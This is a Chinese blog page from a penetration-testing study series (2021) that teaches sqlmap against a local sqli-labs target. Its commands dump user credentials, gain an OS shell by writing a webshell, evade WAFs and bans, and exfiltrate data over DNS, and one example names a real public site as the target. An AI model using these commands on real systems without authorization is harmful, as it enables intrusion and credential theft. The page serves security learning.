@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      渗透测试学习6：sql工具注入 
+      
+      
+      |
+    
+     Hexo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">渗透测试学习6：sql工具注入</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2021-03-17 18:33:18
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="SQLMap常见用法"><a href="#SQLMap常见用法" class="headerlink" title="SQLMap常见用法"></a>SQLMap常见用法</h1><p>用最基础的get型注入开始</p>
+<p>1、当我们发现注入点的时候，<br><code>python sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/index.php?id=1&quot;</code></p>
+<p>2、查看所有的数据库<br><code>python sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/index.php?id=1&quot; --dbs</code></p>
+<p>3、查看当前使用的数据库<br><code>python sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/index.php?id=1&quot; --current-db</code></p>
+<p>4、发现使用的是security数据库，接下来对此数据库进行查询<br><code>python sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/index.php?id=1&quot; --tables -D &quot;security&quot;</code></p>
+<p>5、查出所有表以后，对users表的列名进行查询<br><code>python sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/index.php?id=1&quot; --columns -T &quot;users&quot; -D &quot;security&quot;</code></p>
+<p>6、users表中的列名已经知道了，可以直接查出所有数据<br><code>python sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/index.php?id=1&quot; --dump -C &quot;id,username,password&quot; -T &quot;users&quot; -D &quot;security&quot;</code><br>在“用户”-&gt;“.sqlmap”-&gt;“output”可看到查询结果</p>
+<p>7、查看当前用户：<br><code>python2 sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/?id=1&quot; --dbms=mysql --current-user</code></p>
+<p>8、确认当前用户是否DBA(数据库管理员)权限：<br><code>python2 sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/?id=1&quot; --dbms=mysql --is-dba</code></p>
+<p>9、确认是DBA后，开始执行木马写入：<br><code>python sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/?id=1&quot; --dbms=mysql --os-shell</code><br>接下来会选择脚本语言以及写入的路径，选择好后就可以直接获得系统权限。</p>
+<h1 id="SQLMap一些参数"><a href="#SQLMap一些参数" class="headerlink" title="SQLMap一些参数"></a>SQLMap一些参数</h1><p>-r：sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。<br>比如get.txt文本文件内如下：<br>POST /vuln.php HTTP/1.1<br>Host: <a target="_blank" rel="noopener" href="http://www.target.com/">www.target.com</a><br>User-Agent: Mozilla/4.0<br>id=1<br>再sqlmap中输入：sqlmap -r c:\get.tet</p>
+<p>-m：文件中保存url格式如下，sqlmap会一个一个检测<br><a target="_blank" rel="noopener" href="http://www.target1.com/vuln1.php?q=foobar">www.target1.com/vuln1.php?q=foobar</a><br><a target="_blank" rel="noopener" href="http://www.target2.com/vuln2.asp?id=1">www.target2.com/vuln2.asp?id=1</a><br><a target="_blank" rel="noopener" href="http://www.target3.com/vuln3/id/1">www.target3.com/vuln3/id/1</a>*</p>
+<p>–cookie：这个参数在以下两个方面很有用：<br>1、web应用需要登陆的时候。<br>2、你想要在这些头参数中测试SQL注入时。<br>可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。<br>例子：<code>sqlmap -u &quot;url&quot; --cookie &quot;cookie&quot;</code></p>
+<p>–random-agent：默认情况下sqlmap的HTTP请求头中User-Agent值是：<br>sqlmap/1.0-dev-xxxxxxx (<a target="_blank" rel="noopener" href="http://sqlmap.org/">http://sqlmap.org</a>)<br>可以使用–random-agnet参数来随机的从./txt/user-agents.txt中获取。</p>
+<p>–proxy：可以设置代理，以便防止被ban。<br>使用–proxy代理是格式为：<a href="http://url:port。">http://url:port。</a></p>
+<p>–delay：可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
+<p>–tamper：可以使用–tamper参数对数据做修改来绕过WAF等设备。</p>
+<p>–technique：这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：<br>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）<br>例子：<code>sqlmap -u &quot;url&quot; --technique=TB</code>支持基于时间延迟注入和布尔型注入</p>
+<p>–is-dba：判断当前的用户是否为管理，是的话会返回True。</p>
+<p>–os-shell：可以模拟一个真实的shell，可以输入你想执行的命令。</p>
+<h1 id="大佬使用心得"><a href="#大佬使用心得" class="headerlink" title="大佬使用心得"></a>大佬使用心得</h1><p>1.提高测试等级<br>–risk：RISK 执行测试的风险（0-3，默认为1）。默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。<br>2.增加被测试的参数<br>‐‐level：共有五个等级，默认为1。<br>–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。<br>–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。<br>–level参数设定为3或者3以上的时候会尝试对referer注入。<br>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。<br>3.找到整正的请求页面<br>通常情况下我们直接在浏览器看到的URL上⾯的参数就是被带⼊数据库查询的参数，但是事实上并不是全部的东西 都如我们眼睛看到的样⼦。<br>4.指定测试位置<br>⽤*参数来指定测试语句的位置，这个通常⽤在注⼊伪静态页面。也可以用在正常注⼊点，在手工确认某个位 置可注⼊的使用，使⽤该参数可提⾼注⼊效率。</p>
+<h1 id="SQLMap利用DNS进行oob注入"><a href="#SQLMap利用DNS进行oob注入" class="headerlink" title="SQLMap利用DNS进行oob注入"></a>SQLMap利用DNS进行oob注入</h1><p>–dns-domain参数：如果你控制了一台dns服务器，使用这个可以提高效率。例： –dns-domain 123.com<br>使用方法：sqlmap使用–dns-domain参数时候会监听53端口（dns端口），我们需要把我们获得数据所使用的域名的dns服务器配置到我们运行sqlmap的主机，就可以获得dns外带的数据。<br>因为配置dns服务器的时候也需要dns，所以我们需要两个域名，详细配置如下：配置我们的用于解析dns的nameserver的域名ns1.xxx.com,ns2.xxx.com指向我们运行sqlmap的主机ip。<br>例子：<code>sqlmap.py -u &#39;http://xxoo.com/index.php?id=1*&#39; --random-agent --dns-domain=&#39;rainism.cc&#39; -v 3</code></p>
+<h1 id="SQLMap注⼊伪静态"><a href="#SQLMap注⼊伪静态" class="headerlink" title="SQLMap注⼊伪静态"></a>SQLMap注⼊伪静态</h1><p>“伪静态”顾名思义就是一种表面上看似是静态网页（以.html、.htm等结尾），不存在任何的数据交互，却其实是动态网页，存在数据交互的网站，具有这种特性的网页被称为“伪静态网页”。</p>
+<p>类似<code>http://www.baidu.com/index.php/Home/English/en_NewsDetail/id/92.html</code>的url格式，大概是伪静态，即伪装成静态⽹页的动态链接。这种情况我们是可以测试注⼊的。</p>
+<p>注入方式：<br>与正常的测试⽅法没啥不同，唯⼀的就是指定测试payload的位置。 ⽐如本例中payload位置是放 在 <code>http://www.baidu.com/index.php/Home/English/en_NewsDetail/id/92[payload].html </code>，那么我们 就告诉sqlmap在哪注入就可以了，通过在放置payload位置加上 * 就可以了，即：<br> <code>sqlmap -u http://www.baidu.com/index.php/Home/English/en_NewsDetail/id/92*.html </code></p>
+<h1 id="SQLMap处理高权限的MySQL的注入"><a href="#SQLMap处理高权限的MySQL的注入" class="headerlink" title="SQLMap处理高权限的MySQL的注入"></a>SQLMap处理高权限的MySQL的注入</h1><p>1、当我们发现注入点的时候，<br><code>python sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/index.php?id=1&quot;</code></p>
+<p>2、确认当前用户是否DBA(数据库管理员)权限：<br><code>python2 sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/?id=1&quot; --dbms=mysql --is-dba</code></p>
+<p>3、确认是DBA后，开始执行木马写入：<br><code>python sqlmap.py -u &quot;http://192.168.100.200:8004/Less-1/?id=1&quot; --dbms=mysql --os-shell</code><br>接下来会选择脚本语言以及写入的路径，选择好后就可以直接获得系统权限。<br>注：能爆破出路径sqlmap会自动填入路径，没爆出sqlmap也支持暴力破解或者手工输入。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/03/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A05%EF%BC%9Asql%E6%89%8B%E6%B3%A8/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2021-03-17 18:33:18
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/03/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A07%EF%BC%9A%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%92%8C%E5%90%8E%E5%8F%B0%E6%9F%A5%E6%89%BE/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLMap%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95"><span class="toc-text">SQLMap常见用法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLMap%E4%B8%80%E4%BA%9B%E5%8F%82%E6%95%B0"><span class="toc-text">SQLMap一些参数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%A7%E4%BD%AC%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97"><span class="toc-text">大佬使用心得</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLMap%E5%88%A9%E7%94%A8DNS%E8%BF%9B%E8%A1%8Coob%E6%B3%A8%E5%85%A5"><span class="toc-text">SQLMap利用DNS进行oob注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLMap%E6%B3%A8%E2%BC%8A%E4%BC%AA%E9%9D%99%E6%80%81"><span class="toc-text">SQLMap注⼊伪静态</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLMap%E5%A4%84%E7%90%86%E9%AB%98%E6%9D%83%E9%99%90%E7%9A%84MySQL%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-text">SQLMap处理高权限的MySQL的注入</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
